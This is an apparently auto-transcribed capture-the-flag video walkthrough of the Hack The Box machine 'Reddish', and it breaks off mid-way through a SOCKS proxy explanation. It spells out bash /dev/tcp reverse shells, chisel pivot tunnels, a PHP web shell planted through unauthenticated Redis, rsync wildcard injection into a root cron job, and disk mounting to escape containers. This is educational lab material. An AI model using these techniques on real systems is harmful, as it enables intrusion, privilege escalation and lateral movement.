 what's going on YouTube is hip second I'm doing reddish from hack the box and this box in particular forces you to understand networking pivots we've pivoted before on previous boxes like I think a wreck I but in those boxes we had SSH available to do SSH tunnels and it was only one hub in redish I think we have like three hops to do an SSH isn't available anyway anywhere but SSH not being available isn't really a hindrance at all in fact I don't really care for ssh when doing pivots because I normally use an application called chisel which is written and go and the main reason why I use that application is because it's written and go so it runs everywhere if I want to pivot from Linux to Windows from Linux to a phone to Windows to a phone I can always do it because go runs on almost any OS or hardware so I just love this application for doing pivots and I can't wait to show it all off but before we do that we have to get to the part where we can pivot so let's just jump in as always we're going to store for the end map so I'm Matt - SC for default scripts as VR numerate versions Oh a output all formats but in the end map director and call it reddish then the IP address which is 10 10 10 at 94 this can take some time to run so I've already run it looking at the results we see out of the top 1000 ports and map scans by default none are open so the next thing to do is a full nmap scan so we'll do n that - p - we're just gonna do every port puts one through 65535 i'm gonna specify - t5 to make this an aggressive slash fast scan i'm gonna do - - max retries and set this down to zero i'm going to specify - V so it shows me the open port as it runs and then I'm going to do - Oh a - output all formats will put in the end mapped right and call it all ports - reddish then finally the IP address which is 10 10 10 94 while this runs I'm just gonna try to identify what OS this is so I'm gonna ping 10 10 10 94 and we see it's TTL is 63 so this is most likely gonna be Linux if I ping a Windows box which I'm gonna do 40 because this is blue on active box we see it's TTL is 127 by default windows jelly sets it's TTL to 128 and Linux 63 and whenever ping goes through a light layer three hop it decrements by one so there is a router and it didn't show any ports open I'm gonna do this again and this may be why you'd really see me do - t5 and max retry zero because if it misses the port and it comes back as empty so if this fails again then we'll make this not as aggressive but anyways as I was saying every time ping goes through a router it decrements the TTL by one so if I do a trace route on ten ten ten ninety four we see the hop at 10 10 14 1 this would decremented by one and there we go the ports open so that's why it says 63 instead of 64 so if I paying localhost there's nothing between me and myself so it doesn't decrement that TTL so all we know is it's a linux box and port 1880 is open so I'm going to do another end map we'll do 10 map - P 1880 - I see - sv for default scripts and numerate versions Oh a I'll put all formats putting the ED map thing call it targeted 1880 - reddish and then the IP address and this shouldn't take too long to run because it's just a single port I'm gonna guess probably around 15 to 20 seconds and now nmap has finished it took fourteen point three two seconds and the port is running HTTP service and it's the node J s Express framework so I'm going to go over to its IP address so I want to copy this and specify for 1880 and we see the page just says cannot get / I'm gonna press ctrl you to view the source and I don't see anything that enumerates what this application could be and in most videos you'll see me go straight to go Buster but I'm noticing something is leaking right here we have a icon up in this top left for this site so I'm going to do a request on fav icon ICO because that's just where there's a cons are stored and then I'm going to download this icon and I'm gonna go to google.com slash images we're going to search by image upload an image browse and I want to go to downloads fav icon it will upload the file and we see it is node - red so I do a lot of digging on this application before I continue to kind of figure out what we're working with but that's why I'm not gonna worry about go Buster because I enumerated through a different way so going back to 1880 it says cannot get slash so I'm going to send this over to burp suite make sure grip Suites on intercept and instead of doing a get request we're gonna have burp do a post request so I'm just gonna change to the request method and change from get to post for this on and we see some information we have the path is red slash ID and the ID is here so I'm going to turn intercept off and I'm just gonna get 10 10 foot alright 10 10 10 94 1880 slash red slash the ID and we'll see what happens here and it's loading the application and this is it so I don't know exactly what to call this it's probably a type of programming language or something if I went to the node-red security and went to like a belt I could find out what the application is so let's see what is it called it's a flow based programming tool but we got a bunch of things we can do here and we can probably run commands with exec but if we do exec how do we get output so I'm gonna paste exact run this and I'm just gonna say Who am I going done and deploy and I don't see anything for output or anything so I'm gonna leave this as just exec and I'm going to look at what else we can do we have tcp and tcp again so this TCP I'm going to say connect to port will say C will say 8001 actually I'm gonna do port quad force at 10 10 14 2 and then we're going to send the output let's see this is listen let's see is there different okay so I did the TCP input here I want to do TCP output and we can connect to we can just set this to reply and then drag arrow here drag an arrow here and then let's listen on first let's make sure with 10 10 14 to might not connect to the VPN all right now ton zero so I'm 10 10 14 3 so let's change this to be 10 10 14 3 and do netcat LVN p 4 4 4 4 click deploy and we see we got a connection back when i run commands I'm only getting the standard error if I put some that doesn't exist it says been SH that command is not found so I'm gonna do is if I read this we scroll down one of these should say like this line is standard in this line is standard arrow there we go if we highlight standard out standard error and return code so I want to return everything so if I do all three of those and we listen and click deploy I do LS now we got a shell I can do CDR do LS I'm still in the same directory so we don't have a full shell but we got a shell and that is good enough for now so what do we want to do with this probably run like a linen oom script so I'm going to copy op where is it drive is a capital L linen new blender new SH and I like making a dub dub dub directory let's move this into dub dub dub and then we'll do Python simple HTTP server and go back over to a show curl ten ten fourteen three port 8000 Lynne a new message Co not found W get W get not found so we're having troubles getting a script to this but what we could do is do netcat - L V let's just do port 8000 and direct the contents of linen oom to it and then go back into a shell do we have net cat and see we do not much try cat dev TCP ten ten fourteen three port 8000 cannot open that so let's look at what type of shell we are so do LS - la on then Sh and we'll see we're using - and if we used bash chances are this would work so let's do LS - la been bash bash does exist someone do bash see I'm gonna try cat dev TCP ten ten fourteen three port 8000 and that does show the script so let's do that again let's do bash - see cat 10 1014 through for 8,000 I forgot dev TC TC p10 1014 three 8,000 and we'll pipe that to bash I think that'll work on this and it did not let's try this bash - see I may just direct this to a file in Manly run it SERP netcat run connected and I'm not getting a output so let's just save this to a file and make our lives easy so bash - C cat this direct it to dev sh m lin a new message we have to start up netcat paste and then bash dev sh m linen oom got Sh and it's not running at all so let's try getting a real shell and seeing if that fixes it and getting out of this fake shell so it was turn boop off let's do reverse shell cheat sheet pen test monkey and let's try this bash shell so we want to do bashed SC and then ten ten fourteen three or do port 8000 - that looks fine based NCL VMP 8,000 to run this and now we got a shell so let's go dev sh m dev sh m and we can run bash lin a new mess H and there we go it's running so we're actually getting the output now sometimes playing with all that is annoying and it's just easy to get a shell so while this runs let's go to the top and start looking at it so if we do win a noob let's see what we see we have the Linux kernel which just says we're really on Ubuntu and it's compile date was in 2018 so may not worry about looking for like kernel vulnerabilities since this is most likely up-to-date when the box was released we got group memberships we can look at users we have the node user and then everything looks default passwd shadow file says we can read the shadow file so my guess is we're just in doctor or something if we can read the shadow file there's actually no passwords so I'm gonna guess docker right off the bat going down I get the home directory bunch of files and looks like the command is still running so while that runs let's just look at LS - airway on slash and we do have the darker M file so that confirms that we are inside a docker and looks like linen oom is telling us that as well and I'm also gonna run let's do like IP addr to get the address and we see we won't oh we don't see is 10 10 40 10 10 10 94 the IP address for reddish so all we see is 172 1802 it what's w2 1904 so I'm going to scan both of these subnets so we'll do four IP and actually let's do it in a new window let's do v.i.p scan SH and the reason I'm doing this is just to make it easier to read while we type it so for IP in sequence we'll do 1 2 5 do and then we'll say ping - C 172 1802 dev null and end echo online 172 18 0 I done so what this does if we just pain let's try to paying an IP that probably doesn't exist there we go that IP doesn't exist so ping - C 1 that IP Dev null and and echo online so that ping commands going to receive zero responses and then send a return code of error and that means this and end won't finish because that and en means if the return code means it exited successfully then continue so that's all that is doing so since this ping command exits with an error this end end doesn't happen and it never goes to that echo online so let's go back to the eyepiece can put this on one line so it's easy to copy and paste and then we will run it in our shell let's see does it run I don't have ping - see one forgot that copy/paste and we can see - IPS are on line one and two one is probably going to be the Gateway and two is going to be the box itself if I do ap IP addr yep - is the box itself so let's go back and change this to 19 and change this to 19 copy a ping command and I'd do ctrl L to clear it so there's less junk on the screen paste and we get four IPS on line one two three four our box is four so we can guess that two and three are probably other containers and one is going to be the gateway so let's do a port scan on - so we're gonna fold the same logic that we just did we're gonna change it up a little bit so let's do V port scan SH and the first thing we want to do is loop through a bunch of ports so we can do a four port and let's do like 20 to 25 84 for three 8088 443 you could have also done something like sequence 1 to 65,535 if you want to do all ports but I'm just gonna do a handful of ports we do this quickly and then do echo port done and let's test this so bashed-up dub dub port scan and we have the output so what we want to do is ergo something could be anything into dev TCP 172 1902 and then if that's successful we want to echo open port and we also don't want to have any like error messages so what I'm going to do is we'll combine both of these into one command and then direct errors to Devon all so if I can't port scan and we run this hopefully it works we didn't get any results on that IP so let's just try another IP instead of zero - let's try 0-3 copy this paste it in and it looks like it worked but we have an error it just says open port so let's edit this and instead of single quotes double quotes so it actually processes our variable paste and we have on 172 19:03 port 80 is open now if you didn't want to do bash you could always go to like static build and Matt github and grab this static binary of ED map and copy it on let's see is this it binaries Linux I think was a 64-bit if we download and map save this and go over here move downloads and map and then NC 80 and map we have to do a listening port or do LVN P and then go back to dev SH M and then cat dev tcp 10 1014 382 and map md5sum and map 9 9 d md5sum and map 9 9 d so chmod plus x and the reason why i was doing at md5 sum to make sure it copied correctly they do dot slash and map - p80 once every two 1903 chmod SP 8170 to 1903 mission denied let's see is like a no exec on dev s hm there is so we see right here and no execute so let's just move and that to temp m map - p 81 sent me to 1903 dot slash one of these times I'll get the syntax correct and unable to open maybe it just doesn't like being andhaka try this last one and then we'll just move on so you may want to statically compile it yourself I'm running into issues there but it's probably just easily fixed if you just google these error messages so we have to get to port 80 on 170 to 1903 and we don't have SSH so we can't do Sh tunnels so what I do in this case is use a program called chisel so if we google github chisel and we want to download this so let's clone and go into a cally box git clone chisel and we can just do go build to build chisel and if we look at this de - HS chisel it's a 10 megabyte binary well we could shrink this down a little bit and go does support LD Flags so if we just specify go build - LD Flags - s to remove strip the binary of debug information and - W to remove dwarf information and then do it D you - HS it's now seven point five Meg's so we lost two point five we can also just you px pack this you px root chisel and when this you px finishes it may be even smaller so do you - HS chisel and now we're down to 2.9 Meg's so you can shrink go binaries down a little by just doing things like that and the binary still works so let's move chisel to dub-dub-dub and we can say NC LVN p80 chisel and we want to download it so fast - see cat dev DCP 1010 fourteen 380 and say that is chisel connection effused I never hit enter so let's run this again and do an md5 sum on it chisel f60 md5 someone chisel here F 60 so we got the same binary on both ends and now we have to do a tunnel and this can be a little bit difficult to understand so I wrote some powerpoints to show exactly how SSH tunneling and chisel work so let's jump over into the slides before we get in if you familiar with SSH tunnels just keep mind chisel is everything reversed and an SSH tunnel if you do local which is low you'd probably do a reverse and that is because with SSH you are the client and you're going through the firewall and talking to a SSH server use chisel in situations where you can't talk over SSH and you have to say hey client connect back to me and then open up the tunnel so with chisel we are the server and we're talking to the client and routing through it so we're doing a reverse pivot first and reverse just means the remote box is listening and the remote box in this case is our box our box here because we're running the commands on the client so hopefully that makes sense and if it doesn't it'll make sense once we go through this so the very first thing we do is on our box on the server end the callee box whatever we say hey chisel we're the server we want to listen on port 8000 and we also want to allow reverse connections and then we go over to the client and say chisel we are the client connect to our box on port 8000 and with that we want the remote box which means our box here to open up port 8000 and 1 and whenever we see a packet go in on 8001 we're going to direct it through that tunnel we created on port 8000 and send it out to 172 1903 80 so that allows us to do a curl command to localhost 8001 and then we access the other end so let's go and actually do that to see it work in practice and hopefully it makes sense once you see at work the first thing we have to do is stand up the chisel server so we do dot slash chisel say server - be 8000 - reverse to allow reverse connections and then - be for verbose and I like this just because oftentimes if I make a typo somewhere the reverse flag tells me if they connect it to me or did not so now we go over to the client which is reddish or the pound box so we'll do slash temp chisel client then the IP address which is 10 10 14 3 port 8000 and then when I specify remote port 8000 1 and direct this to 172 19:03 on port 80 so when we run this we can see it handshakes and it opened up the proxy so if we go here and do a curl localhost 8001 I forgot the colon we can see we get a web page back now there's one thing I don't like about what I just did and if we look at netstat al NP on grep for 8,000 one we see it's listening on quad zero which means anyone on our network or that can get to a Cali box can access our tunnel so I'm going to kill chisel soapy kill - million chisel and we can do temp chisel client ten ten fourteen three point eight thousand and then reverse specify one twenty seven zero zero one eight thousand one 172 1903 eighty so what this is going to do is tell a server to listen on local host on port 8000 one we see handshaking it's open and now if I do that net stat again we'll only listening on localhost so it's a bit more secure and if you're doing this you should also look into like the - fingerprint option and when chisel starts up there is a fingerprint and then you can paste that option in your client as well to make sure your client only connects to intended servers but now with port 8000 one open we can look at what the connection is and we see it's just the default it works page but we have a few other things so let's view what it looks like through a web browser ten ten ten we want localhost and 8001 we don't see anything but if you press ctrl you to view source you can see everything else so we have a function get data and it's getting this URL so let's copy this 10 10 10 I always say that localhost 8001 and paste this in and we get hits it says 3 so number of hits : so we're not seeing this we're just getting the data response but that's fine so we have another function increment counter so let's copy this localhost 8001 paste it's not really doing anything we hit enter we get four so it has moved up the next function let's see share a web folder with the database container done and then add code to backup the databases so if we try this let's see if we can access files is it like a lfi localhost 8001 and let's back up Etsy passwd and we don't get anything but from this it says there is a note that says the web folder and database container are shared so let's see if we can access the database server I'm going to guess that it is 172 1902 because if we go back to our box and do IP address we have this one link one sim to 1904 and we found something on three we know two is active boy didn't see any open ports so what I'm going to do is let's open up a another reverse shell so NC l VN p i'll say seven thousand one and let's do bash - sea bass - I I think it was that dev TCP ten ten fourteen three there's a seven thousand one I did and then I think that's the syntax for the bash shell yep so we have the shell let us go back into dub-dub-dub and the port scan we have I've already changed it actually to instead of all the numbers it's sequence one to 65535 so when I paste this in it will tell us when a port is open and we have port six three seven nine open and my apologies for not showing me editing this file I noticed probably right after I ran this command that my screen recorder was still recording PowerPoint and I was just recording voice so I'd already do a portion of that apologies for that but that's the only change I made so we have to now have chisel connect back to us so ten ten fourteen three eight thousand and we're doing a different reverse connection we still want it to be on one 2700 one but this time six three seven nine I believe yep six three seven nine and then we direct that to 172 19026 three seven nine and I forgot the client feature so copy this tell chisel it is the client connect we see session three handshake we have open to proxy so now if I do nmap - st to specify tcp scan by default it's a sin scan and since can does not work through proxies so we do st - p 6 3 7 9 - SC 4 enumerate our default scripts as V enumerate versions and then localhost I also want to say it goes and and map what should we call this one semi - 1902 so now we're doing the scan and what tells see if n map can identify what software this is so it tells us it is Redis so I'm gonna go over to Firefox and do Redis remote command execution go to the packet storm security and we have a bunch of things so the first thing is doing is saying hey tone it to us and then echo no author acquired so let's try this so NC 1010 NC localhost 6 3 7 9 no auth is required and it looks like that command goes through the other thing I'm going to do is go back to this and where Ajax dot PHP test is let's do echo wrong number of arguments so if we do help echo or let's do just echo hey know author's required and we get it here so this age X dot PHP thing looks like it's a direct connection into Redis itself so if we had just enumerated based upon like messages like if we did help let's do about just trying a bunch of commands you may be able to enumerate it is Redis that way so we have successfully found out that no auth is required and then they do a bunch of things this is small text and a lot of text so I'm just gonna do the commands I know so let's do flush all and then we can set please subscribe this could be anything to PHP code because we know based upon that note on the page that there is the web server directory shared with the database server so I'm going to try a drop in a PHP script to see if it executes so let's do that then system request if sec so just a quick PHP shell unbalanced quotes I don't have an end quote so copy paste broken pipe flush all let's paste this in okay so the next thing we need is to do a config set DB file name and we'll call this if SEC PHP config set dir dub-dub-dub HTML and save so we're writing a configuration file called ape SEC PHP to VAR dub dub dub HTML and then if I go over to this localhost 8001 yep SEC PHP we can see it exists and if I give it the variable if ii do Who am I we can see we're dub dub dub data so we definitely have code execution here so let's send this over into burp to make it a bit easier to work with and I stepped on send this to repeater tab we click go again we see we are dub dub dub data so let's give us a give ourselves a shell so we'll do change this request method and we want to do bash - see bash - I was it this dev TCP and before we do a shell let's just see if we can talk to ourselves so let's do bash - see because I just realized if we do IP addr we have dot 19 and dot 20 and the previous container that we are on has 18 and 19 so what if only 18 can talk back to us and 19 cannot so let's try ping - D 1 10 10 14 3 click go and it doesn't look like we can connect to ourselves so we have to do a different tunnel because this guy cannot talk to our hacked our machine but he can talk to the web server so we can do a nother port forward to listen on the web server and direct it back to us so let's go into the syntax of doing that so the local pivot is very much like the reverse pivot except it just means the port is being opened up on the client and that is normally your local box so the very first thing we do is spin up a chisel server on the server with chisel server - P 8000 and then we go over to the client and run chisel client HDB port 8000 to connect to the server and then we specify 9001 and then localhost 8001 so what that's going to do is open up port 9000 1 on this guy and then any box that sends anything to this is going to go through the tunnel and land on port 8000 1 what that allows us to do is send a reverse shell from somewhere on the network to 9001 and then receive it on a cally box the other way a lot of people use local pivots is to access like port 4 4 or 5 of a Windows box and you just remove the one 27001 and put what IP address you wanted so 10.1 3.37 for 4 or 5 would go through the tunnel and then access whatever box is at that so that is the local pivot so let's see it in action on the client let's run temp chisel client I could spell that correctly then 10 10 14 3 4 8000 and we want to Ford 9000 one-to-one 27001 8000 one set this we see it verify the connection and now it's open so let's go here and listen on port 8000 1 it's already in use netstat a LNP grep 8001 I'm using it for something crap let's change this the downside when doing a lot of port forwards is sometimes you reuse ports so let's listen on port 9000 to and sent to one 27001 eight thousand five I know that's not in use okay now we can do net step we don't see anything listening on port 8000 five so he do NC l VN p eight thousand five okay so let's go back into burp and we see a four four not found on our script so it looks like there's something that cleans it up so let's just save this again click go so now we see our script is back there so we can do bash jesse bash - i this then dev tcp 172 19 0 what is the web servers IP 0 4 then port we said 9,000 - I think and then I think that's the syntax lets URL encode it click go not found that's annoying save go we're not getting a response back we go to a net cat now we have a shell on the database server so let us do LS dash away on slash and we see a backup directory and that's not Romi not in use so let's do CD / backup when we look at this we got backup Sh and if you cap this file we see it's CDs into this directory does a rsync and we got a wild card here so let us check if there's any like vulnerabilities in our sinks so I'm gonna do the gtfo bins and again this is just like wall bins on windows let's turn burp off gtfo bins and then type our sink we see we have a way to get a shell so that Daffy flag and our sink allows us to looks like it executes code so if we have a file and the files name is - e and ends with dot o DB we can inject commands into this so let's see that in action first it is going into this directory actually we have to find out if this script is being used so let's do that SH M and let's just get that a linen ooh Sh because I think we have to open up enough the Tumbo to do that so let's go here and we want to do a local Ford so let's do temp chisel client will do 9003 one 27001 8006 we see this session is open so let's should be safe to get rid out of this shell and we can name this DB docker so CD dub-dub-dub Python gem simple HTTP server port 8000 5 is where I thought we listened on 8006 and then we can cat dev TCP 170 to 1904 port 9000 3 and normally when you do tunnels I like keeping the port consecutive on both ends of the tunnel but for this video to show you exactly like if I put mic 8006 colon 8006 you wouldn't know which end is which so that's why of them different here normally I keep them all the same so save this file and I forgot to live oh I didn't want that I want an NC L vnp 8006 because we probably don't have curl neck cat or whatever so I don't want a HTTP request base this cat linen oom that Sh we can see we got the script and we can execute the script so go to the top oh let's see here we go so just like the last one we see we're in a Ubuntu container same kernel our host names dub dub dub before it was root I believe that's the passwd roots the super user account some of these things won't work just because it doesn't have the binary it's expecting because it's a stripped down container got a bunch of hidden files some user files world readable files in home it's going down and we have a file called back up inside of Etsy cron D and we can read it so if we looked at this if we go to let's see cron D back up it's just executing that backup script every three minutes so now we know for sure if we edit this script or not at the script abuse this or sync it will get ran so let us do that so we want to go into for WH T ml and then we have to create a file name so we do touch - - actually to make this easier let's not do it touch just yet and create a file because we have to run a few commands and it gets nasty chaining commands and a command line so let us create the file on our box because we don't have like VI or Nano probably so let us do VI on please subscribe dot r DB and the file just has to end in our DB because again in order to match this story already be if that makes sense hopefully it does so in bash I would've been SH and then we can do CP bin - and then chmod for 755 when I copy that to temp probe esque and then damp Prive ask unlike the bash shell the - shell does not drop set UID so if we just copy - and then give it the ability to do set UID it will allow us to privacy so in order to get this file over to the Box let's base64 please subscribe we can specify - with 0 to put it all on one line and we can copy this I don't know why this window just popped up and then go back to the shell and we can say echo this base64 - D - temp please subscribe dot or dB I think it's the following path is it ODB back up ODB yep so LS dash L a slash temp and we have please subscribe oh D be if we cat this flash temp it's just going to move - to privacy and then chmod so let's just make sure then - exists it does so this should work so now we let's just clear a bunch cat backup dot s was it / backup so now we just have to put a file in this directory so touch and then specify this and then the gtfo bin said use the - E - Xu commands so I'm just doing - E and then this should all be in quotes because spaces will be seamed as terminators if they're not okay so we want - e SH oh I don't know if I can do Slash's in a file name probably not so we'll move the please subscribe file right after we run this so we do LS on that f18 directory we have that as a file let's move that into the f18 directory and probably have to create this again that's where the file is gone let's see there we go so now we got the file and this and just make sure that didn't execute if we do LS on temp it's empty so it is currently the 33rd minute so in about two minutes this will execute it will do let's see our sync - a and then because this Tarou dB it will actually pick up this file name so do - e Sh please subscribe ODB and then this so this will be the entire command it is running and because it's got this - e it should execute this I'm not sure if I have to put this in quotes that's the only thing I don't know that if it fails I probably forgot to put this in quotes so let's see does this have it this does use it in quotes so let's do that touch - e Sh then this so we do LSL a on that directory again and now I got one with quotes so this should work we will get date we got another minute left so I'm just gonna fast forward the video and not make you wait so it's been the minute we look at date and let's look at this directory we see it cleared it out so the cron definitely ran we look at temp we do have privacy we do LS - la own temp it does have that set UID bit so let's try executing so temp probe ask and do ID our effective ID is now root and if we exit this did ID before we don't have that so now with root permission we should be able to go into slash root and it does really bias anything the only thing it bought us is the ability to go into these home directories I think it's Samar oh and we can now read user dot text so we do that we can see it's three three characters I don't think the burger guy has anything in it nope so having root on this container doesn't really help us at all I'm just gonna exit out of that because if we go back to that backup script we shouldn't have asked ourselves the question where is the password that's the question we should be asking ourselves because it's doing this or a sync going to backup week at Etsy hosts we probably don't know where backup is I'm gonna guess it's going to be once NB to 2002 can we ping - t1 backup cannot open ICMP socket pain - t1 backup okay so we can see yes it is 172 2002 so I guess being route allowed us to see that but we could have made that guest just based upon how the networking was done before so let's look at backup SH and it's not doing any type of password on this rsync thing so let's try going into town or a sink - a specifier sink colon slash slash back up and let's try like Etsy shadow outside of this directory and can we copy this on no such file or directory exists let's see iris ink - eh oh I don't have a colon I think that was it and we need get an error message here if we catch shadow well now we have access to file with root permissions on the backup server so let's try our sink backup instead of that let's try root root text and the file does not exist so we have to find a way to get code execution on this and the easiest way is just by pushing a cron job so let us do that before we can really push a cron job we have to remember that the backup server probably can't get to us because we have our Kali box which is on the 1010 14-0 then you got no red which is once MD - 18 + 1 72 19 then you got the dub dub dub server that is on 172 19 and 172 20 and then the backup server which probably is on 170 to 20 and who knows if it's fall in this game it's 170 to 2100 and there's another hop or something weird but let's see but because the backup server probably can't talk to node-red we have to set up a chain of tunnels so we're going to go from Cali to no dread to dub-dub-dub to backup and we want backup to be able to talk directly to a Cali box so to do that or Cali is going to be listening on 8000 and then node-red we're going to say everything that comes in to port 8000 10 direct that to 8,000 so node-red is acting as a proxy to the server of chisel and then on dub-dub-dub we can say connect to node red on port 810 and then forwards port 80221 27001 9005 so then on the dub-dub-dub server port 80 20 we'll be going back to a Cali box and listening on port 9000 and 5 so that is the hope that we can set up all those tunnels easily so let's begin doing that so let's go back here tap chisel and then we need client then 10 10 14 3 foot 8000 and we said the very first top is a t10 so a t10 one 27001 or 8000 so now we have that connection open so temperatures old client 10 10 14 3 8,000 and I'm also gonna open eighty eleven and this one is going to will say nine thousand four if this board is still open my box looks good and the reason why I did nine thousand four is because we have to get chisel over to dub dub dub so NCL vnp nine thousand four chisel go here and we can say cat bash - see cat if I don't mean faster I see I'm in bash just in case I'm not in bash cat dev TCP 170 to 1904 that is the IP address of no dread and no dread we said was listening on port 80 11 and that goes to chisel looking here we have a connection we can md5 sum chisel and md5 sum chisel f60 f60 so now we got chisel on dub dub dub so let's go back to our notes and we want to have chisel connect to no dread so first let's make sure chisel is executable it is so we can do tamp chisel then and if it wasn't executable that's where we just chmod 755 chisel but temp chisel client then 172 1904 port 80 10 and that is going to connect to no dread which for just to 8,000 of our cally and we wanted to say open up port 80 20 do now five if we look we have that connection open so now if anything talks to the dub-dub-dub server on port 80 10 it goes to a Kelly box on port 9000 five the issue right now we're having is the I didn't put an end at the end of this so I don't have a terminal on dub-dub-dub anymore so we have to send another one so let's do that and see LVN p9 thousand six and we go back to this temp chisel client ten ten fourteen three eight thousand and let's forward port 80 twelve to one twenty seven zero zero one nine thousand six so that's now open we go back to boot we should be able to change this to nine thousand six probably have to save the config again click go and did not work that's listening on nine thousand five and CLV MP 9006 it's listening somewhere okay I'm listening there why did that not work oh I'm listening on port 80 twelve there we go so go over here and we have the shell so now we have to create a cron job so we can sync it up to the backup server so let´s do echo one two three four five route bashed RC bash - I and then dev TCP just going to echo that so I can do IP addr to get the IP and we probably want 172 2003 172 2003 and we said it's on port let's see 80/20 I screwed up my standard end so 172 2003 cord 80/20 and then double single to run me so we can run me we got it there so let's cut that backup script to get the arcing syntax so we're going to do or a sink - a send run me to our sing backup 873 SRC Etsy cron D and then run me looks good and we can sleep 60 and within 60 seconds we should be getting a shell so just looking at this 2003 8020 oh shoot where is this echo I screwed I forgot something that's what I need and then our sink and we can always test this command so it does work so we're just waiting for the server to execute this still nothing it should have happened so let's see what could I have screwed up let's cat run me and let's see that looks fine unless the database server doesn't see 170 to 2003 but if we do ping see right database backup yeah it should see 170 to 2003 something is wrong with the cron let's see where is my echo scatter on me let's echo this can I do quotes that way yes I can so try this do run me that may be a bit better so we can try or syncing this so copy this paste this in and see if we get a shell and we still don't have a shell so what I'm going to do is we'll go back to this docker container then do a sync - capital a to preserve permissions a I think we'll do a directory and V is verbose or a sink backup 873 source let's see cron dot d and we'll specify a working directory and doesn't look like that worked so what did I screw up Oh sync let's just specify - AAA or sync back up 873 source Etsy grandi make Chrome maybe it doesn't like that period and copy it into the con folder nope let's see can we copy source Etsy grandi run me something's wrong cat / backup backup got SH oh sink - a maybe doesn't like that capital a I thought that was preserved permissions we'll try just a V let's see failed exec SSH oh I don't have earth there we go okay so it doesn't like capital a and there should be Oh I copy drawn me cat run me that's what we expected so let's try or a sink - a P V what I'm trying to do is get the permissions of the file I'm copying source at C cron T there we go it's all owned by me I wonder if that's just because I can't do it see cat run me so let's try something real quick let's do previs okay and then let's see H own copy run me to shell CH own shell CH own root shell there we go and we also want CH own plus as the group okay now let's try a sink - a pv shell - a sink backup 873 source Etsy grandi shell that copied it over sleep 60 seconds and hope we get this one to run it spin 60 seconds and still don't have a shell this is getting rather annoying so let's move shell to Etsy prong D look at date and 25 seconds we should get a shell back so now I'm just testing on my local box or not my local box on this box maybe it's just the database isn't executing and then the next step is we saw con dot d had a clean so I'll just overwrite clean next but right now I don't know if I'm doing this syntax correctly so that's what we're testing now it's been a new minute and we don't have a shell so it must be the syntax we are doing because if we just executed this we have to copy the bash - see if we just executed this we get a shell so we have to do something different because it doesn't like how about passing the show it's probably got too many like special characters so a way around that is to use base64 so let's do that so the first thing to do is echo this now we can do this in single quote and then pipe that to base64 get the syntax and then we can do echo 1 2 3 4 5 root then let's do this from the root shell just so we have it created as root in case it's like NFS and passes the username and all that stuff for permissions because I want the N file to be owned by root so I'm starting this as root just because it may do that I don't know echo 1 2 3 4 5 root and then we want echo the base64 decode it and then execute with bash okay and this will be we'll call this clean and we're going to overwrite clean so if we cat clean we have root then echo all that base64 - DD that looks good so let's our sink - a V P to preserve permissions or sink backup 873 source Etsy grande D and I need this filename first clean or a sink backup 873 source Etsy grandi clean we sent that file over so date and one minute we should get a shell back a call back if this works so sleep 60 and we'll hope and there we go we finally have a shell on backup as root so we go into the root directory we still don't see the root text do IP addr we see only one network interface so to get lint a numb over to this box we have to go back to our docker container and won't afford another port so the last time we've ordered a port we just did this so we can paste the command in and then we can say listen on 8021 and four-to-one 27001 and I think 9006 is open let's just make sure it is so let's do an CL v NP 9006 yes we have that open so we can start this port forward it connected and then go into dub dub dub and then netcat l v NP 9006 copy over land and um go into temp and then just download this so we'll do cat dev TCP 172 was at 2003 slash what port did we say 80 21 and I read that just here and we direct that to when a new message and that does not look like it worked it would help if I hit enter there pace it in we see it connected and we have the file so let's run this and hope this is the last time we have to do this so let's go to the top and let's just search for this so cache when go to the top and we'll go down we can ignore the kernel we got the hostname we're running as root passwd shadow routes home directory cron processes whoops don't mean to copy where was it I think this is where we were let's see okay all I'm doing is searching for the bracket - bracket and this lets me hop whole contents so I don't want super user we don't need root files owned by our user I don't care hidden files yeah maybe come back to that home directories no environment information not to interesting shells you mask password storage cron jobs nothing interesting there Network information nothing our table doesn't have anything coming up with a lot of just not interesting things that's the way D&G you ID'd not really gonna be interesting because well we already root and I fast nothing and I think that's it so we didn't really come up with anything if we do ALS on /dev and just look at what darker stuff we have let's go up looking at our block devices a bunch of loop we get a bunch of Stas and if we just do LS flash dev SD and if we go back to like a database doctor oh that one we live active terminal on this one we do I last less dev SD we don't have anything everything's mounted as Ella slash dev grep SD so it's mounted oddly we see dev SD a one is mounted but if we look in slash dev we don't see it if we do bash - see eyelash slash dev see if it's that way we just don't dev is relatively empty but if we go in our database container we have a bunch of things so let's try mounting one of them we're just running mount first and we see a SD a one on Etsy - resorb comm SD a one on slash backup please look at backup we just have the webserver because that's what it's backing up but let's just make a directory on temp called SD a one two three four five six seven I think OS there's all directories so LS /dev SD so we'll mount dev SDA one on SDA one mount dev SDA two on SD a2 and so on and we're going to see what all these discs are that looks like it may be a swamp okay so the SD a5 is swap I don't know what SDA for was but let's just look at SDA one and we see a file system so let's go into SDA one we can go into root and we can see root X finally WC - see root text let me see it's 33 characters there's also a dot SSH but SSH wasn't exposed so that's not that interesting if we look at SDA - looks like this is slash boot if we look at SDA 3 this is probably home do we have any files here of interest we do not and SDA for I don't think mounted so if we wanted to we could go into SDA one going to Etsy cron D and then go back here I don't know where we have it the reverse shell we'll just do it again so echo what is it 1 2 3 4 5 root and then echo - dev TCP 1010 14 3 and we'll say this on port 101 like that just because I know that port hasn't been used before and we've used a lot of ports so and then was it zero and one that looks good base 64 it copy this and we can just do it here echo 1 2 3 4 5 root all right go that a 64 - D - to run me NCO BN P 100 101 date and within probably the next 30 seconds we should get a shell from redish has root there we go we have a shell if we do LS we see root dart x WC root dot txt and this box since we're probably not in docker you should have Python so we can do import PT y PT why not spawn bin - and there you have it reddish is now completely rooted if we do IP addr we can see all the network interfaces so hope you guys enjoyed that box now that we have this done we're going to be going back a little bit do one last thing with a proxy and then call it a video so let's hop back into PowerPoint so we can show you a reverse socks proxy so throughout this video we've been just clearing all the tunnels manually which is great for understanding exactly how it works but when it comes to scaling it becomes very tough it would be amazing if you could just say hey all the traffic we're going from here let's just send it over to this box and then trust this box is routing table to decide where it goes so when we want to talk to a web server we can and then if we want to just say you know what actually we didn't want port 80 we want point 22 we don't have to go create a whole new tunnel because we just have this socks proxy working and chisel is capable of doing this it's just got one tiny catch and that is the socks client only works when it is in client mode and in most cases we'll be running chisel in server mode so to get it working in client mode on the server we actually have to do kind of a chisel and a chisel so let's just look at exactly how it works the first thing is we stand up chisel standard on port 8000 allow reverse connections and then on the client we're going to connect with this and then create a reverse connection on port 8000 one and for that to local host port leet one three three seven and then we're going to run a second chisel command on this client as a server and I'm going to say chisel server - P leet - - socks5 and that's going to create a 